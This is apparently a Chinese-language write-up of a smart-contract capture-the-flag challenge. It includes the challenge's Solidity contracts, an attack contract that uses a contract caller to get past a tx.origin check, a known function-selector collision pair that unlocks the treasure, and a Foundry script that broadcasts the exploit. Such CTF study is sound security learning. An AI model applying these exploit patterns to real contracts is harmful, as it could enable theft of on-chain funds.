源码：`Setuo.sol`&`Contract.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import {Treasure} from "./Contract.sol";
contract Setup {
    Treasure public treasure;
    bool public solved;
    address internal deployer;

    constructor() payable {
        treasure = new Treasure(1 ether);
        deployer = msg.sender;
    }

    function isSolved() external returns (bool) {
        if (treasure.unlocked()) {
            solved = true;
        }
        return solved;
    }

    function getTreasure() external view returns (address) {
        return address(treasure);
    }

    function withdrawEther() external {
        require(msg.sender == deployer, "Only deployer can withdraw");
        payable(deployer).transfer(address(this).balance);
    }
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Treasure {
    uint256 public treasureAmount;
    bool public unlocked;
    address public owner;
    uint256 public lockCounter;
    bytes32 private hiddenHash;

    constructor(uint256 _treasureAmount) {
        owner = msg.sender;
        treasureAmount = _treasureAmount;
    }

    modifier onlyEOA() {
        require(msg.sender == tx.origin, "Only EOAs allowed");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    function becomeOwner() external payable returns (address) {
        require(msg.value > treasureAmount, "don't ride for free");
        require(
            msg.sender != tx.origin,
            "The vassal of my appendage is not my appendage"
        );
        owner = msg.sender;
        return owner;
    }

    function setHiddenHash(string memory secret) external onlyOwner {
        hiddenHash = keccak256(bytes(secret));
    }

    function dummyCheck(uint256 x) public view returns (bool) {
        return (x % 42 == 0 && tx.gasprice < 1000000000);
    }

    function getHiddenKey(
        string calldata _string1,
        string calldata _string2
    ) external returns (bool) {
        require(msg.sender == owner, "only owner can set hidden key");
        require(
            keccak256(bytes(_string1)) != keccak256(bytes(_string2)),
            "No two leaves are alike"
        );

        bytes4 sig1 = bytes4(keccak256(bytes(_string1)));
        bytes4 sig2 = bytes4(keccak256(bytes(_string2)));

        if (sig1 == sig2) {
            unlocked = true;
        }

        lockCounter += 1; //
        return unlocked;
    }

    function isLegitKey(bytes calldata key) public view returns (bool) {
        return key.length > 12 && key.length < 32;
    }
}
```

目标就是变量`unlocked`为`true`，浏览合约变量只在`getHiddenKey`函数中被设置为`true`，需要满足两个条件，一是调用者是owner，二是传入的两个参数的哈希不相同，但是前四个字节相同，参数的获取想到了函数选择器冲突，在WTF里面有一组函数选择器冲突的例子可以用。

调用者是owner可以调用`becomeOwner`函数实现，但是需要满足`msg.sender != tx.origin`，也就是调用者不能是我，所以写一个攻击合约，`msg.sender`就是攻击合约，`tx.origin`是我，两个不相等，满足条件。

因此只需要攻击合约调用`becomeOwner`函数成为owner，再调用`getHiddenKey`函数传入参数就完成了

攻击合约：`Attack.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import {Setup} from "./Setup.sol";
import {Treasure} from "./Contract.sol";
import {Script, console} from "forge-std/Script.sol";

contract Attack {
    Setup public setup;
    Treasure public treasure;

    constructor(address _setup) payable {
        setup = Setup(_setup);
        treasure = Treasure(setup.getTreasure());
    }

    function attack() external payable {
        treasure.becomeOwner{value: 1.1 ether}();

        string memory str1 = "burn(uint256)";
        string memory str2 = "collate_propagate_storage(bytes16)";
        treasure.getHiddenKey(str1, str2);
        
        console.logBytes4(bytes4(keccak256(bytes(str1))));
        console.logBytes4(bytes4(keccak256(bytes(str2))));
    }
}
```

脚本：`Hack.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import {Script, console} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";
import {Setup} from "../src/Setup.sol";

contract POC is Script {
    function run() public {
        vm.startBroadcast();

        Setup setup = Setup(0xc6Ea44BF288286cb975192eBAaAdEd9596831A68);
        Attack attack = new Attack{value: 2 ether}(address(setup));
        attack.attack();
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}
```

